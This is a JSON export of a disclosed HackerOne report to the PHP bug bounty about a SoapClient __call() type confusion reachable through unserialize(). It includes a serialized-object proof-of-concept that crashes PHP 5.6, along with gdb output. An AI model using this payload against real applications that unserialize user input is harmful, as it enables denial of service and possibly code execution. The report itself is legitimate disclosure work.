{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "2500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 55030, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-03-03T00:00:00.000Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "SoapClient's __call() type confusion through unserialize()", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$2,500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "reporter": {
                "username": "cogitoergor00t", 
                "url": "/cogitoergor00t"
            }, 
            "created_at": "2015-03-03T00:00:00.000Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-15T13:29:44.258Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1196206, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-04-06T05:11:04.240Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-06T05:11:04.240Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "bounty_amount": "2500.0", 
            "collaborator": {
                "username": "cogitoergor00t", 
                "url": "/cogitoergor00t"
            }, 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 372845, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "cogitoergor00t", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/cogitoergor00t", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/020/061/3edeef7d9d8b8a6151610c475fd927b51d73ad7a_small.jpg?1435713632"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2015-03-03T00:00:00.000Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/55030", 
    "created_at": "2015-02-19T00:00:00.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><a title=\"https://bugs.php.net/bug.php?id=69085\" href=\"/redirect?signature=cf4809f41a00e3aef90c86a0be1de0f4b32a4315&amp;url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D69085\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.php.net/bug.php?id=69085</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"description\">Description:</h2>\n\n<p>SoapClient&#39;s __call() method is prone to a type confusion vulnerability which can be used to gain remote code execution through unsafe unserialize() calls.</p>\n\n<p>In soap.c:2906</p>\n\n<p>if (zend_hash_find(Z_OBJPROP_P(this_ptr), &quot;<strong>default_headers&quot;, sizeof(&quot;</strong>default_headers&quot;), (void **) &amp;tmp)==SUCCESS) {<br>\n       HashTable *default_headers = Z_ARRVAL_P(*tmp);</p>\n\n<p>the Z_ARRVAL_P macro is called on __default_headers assuming that it is an array without any actual check about it.</p>\n\n<p>It has been shown several times that this kind of vulnerability could lead to crash, arbitrary read/write memory access and code execution, so I&#39;m not discussing about the actual exploitation of this one (you can refer to my previous submissions about natsort() and extract() if needed by the way).<br>\nHowever, it&#39;s worth pointing out that given the nature of __call() magic method, any direct call on a user-controlled userialized input should be considered remotely exploitable.</p>\n\n<h2 id=\"test-script\">Test script:</h2>\n\n<p>&lt;?php</p>\n\n<p>//tested on 64bit Ubuntu PHP 5.6.6<br>\n//crash on memory access violation <a href=\"/1337\">@1337</a></p>\n\n<p>$dummy = unserialize(&#39;O:10:&quot;SoapClient&quot;:3:{s:3:&quot;uri&quot;;s:1:&quot;a&quot;;s:8:&quot;location&quot;;s:22:&quot;<a title=\"http://localhost/a.xml%22;s:17:%22__default_headers%22;i:1337;%7D&#39;\" href=\"/redirect?signature=f6b134d96e8f0564bf219d08253ce596753313b4&amp;url=http%3A%2F%2Flocalhost%2Fa.xml%2522%3Bs%3A17%3A%2522__default_headers%2522%3Bi%3A1337%3B%257D%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://localhost/a.xml%22;s:17:%22__default_headers%22;i:1337;%7D&#39;</span><i class=\"icon-external-link\"></i></a>);<br>\nvar_dump($dummy-&gt;whatever());</p>\n\n<p>?&gt;</p>\n\n<h2 id=\"actual-result\">Actual result:</h2>\n\n<p>(gdb) r soapvar.php <br>\nStarting program: /usr/bin/php soapvar.php<br>\n[Thread debugging using libthread_db enabled]<br>\nUsing host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.<br>\n[New Thread 0x7fffec568700 (LWP 13984)]<br>\n[Thread 0x7fffec568700 (LWP 13984) exited]</p>\n\n<p>Program received signal SIGSEGV, Segmentation fault.<br>\nzend_hash_internal_pointer_reset_ex (ht=ht@entry=0x539, pos=pos@entry=0x0)<br>\n    at /build/buildd/php5-5.6.3+dfsg/Zend/zend_hash.c:1020<br>\n1020            *pos = ht-&gt;pListHead;<br>\n(gdb) x/i $pc<br>\n=&gt; 0x6e93d3 &lt;zend_hash_internal_pointer_reset_ex+3&gt;:    mov    0x20(%rdi),%rax<br>\n(gdb) p $rdi<br>\n$1 = 1337</p>\n", 
    "vulnerability_information": "https://bugs.php.net/bug.php?id=69085\n\nDescription:\n------------\nSoapClient's __call() method is prone to a type confusion vulnerability which can be used to gain remote code execution through unsafe unserialize() calls.\n\nIn soap.c:2906\n\nif (zend_hash_find(Z_OBJPROP_P(this_ptr), \"__default_headers\", sizeof(\"__default_headers\"), (void **) &tmp)==SUCCESS) {\n       HashTable *default_headers = Z_ARRVAL_P(*tmp);\n\nthe Z_ARRVAL_P macro is called on __default_headers assuming that it is an array without any actual check about it.\n\nIt has been shown several times that this kind of vulnerability could lead to crash, arbitrary read/write memory access and code execution, so I'm not discussing about the actual exploitation of this one (you can refer to my previous submissions about natsort() and extract() if needed by the way).\nHowever, it's worth pointing out that given the nature of __call() magic method, any direct call on a user-controlled userialized input should be considered remotely exploitable.\n\n\nTest script:\n---------------\n<?php\n\n//tested on 64bit Ubuntu PHP 5.6.6\n//crash on memory access violation @1337\n\n$dummy = unserialize('O:10:\"SoapClient\":3:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:22:\"http://localhost/a.xml\";s:17:\"__default_headers\";i:1337;}');\nvar_dump($dummy->whatever());\n\n?>\n\nActual result:\n--------------\n(gdb) r soapvar.php \nStarting program: /usr/bin/php soapvar.php\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n[New Thread 0x7fffec568700 (LWP 13984)]\n[Thread 0x7fffec568700 (LWP 13984) exited]\n\nProgram received signal SIGSEGV, Segmentation fault.\nzend_hash_internal_pointer_reset_ex (ht=ht@entry=0x539, pos=pos@entry=0x0)\n    at /build/buildd/php5-5.6.3+dfsg/Zend/zend_hash.c:1020\n1020\t\t\t*pos = ht->pListHead;\n(gdb) x/i $pc\n=> 0x6e93d3 <zend_hash_internal_pointer_reset_ex+3>:\tmov    0x20(%rdi),%rax\n(gdb) p $rdi\n$1 = 1337\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.php.net", 
            "about": "", 
            "twitter_handle": "", 
            "name": "PHP (IBB)"
        }, 
        "handle": "ibb-php", 
        "url": "https://hackerone.com/ibb-php", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 29, 
        "default_currency": "usd"
    }, 
    "is_published": false
}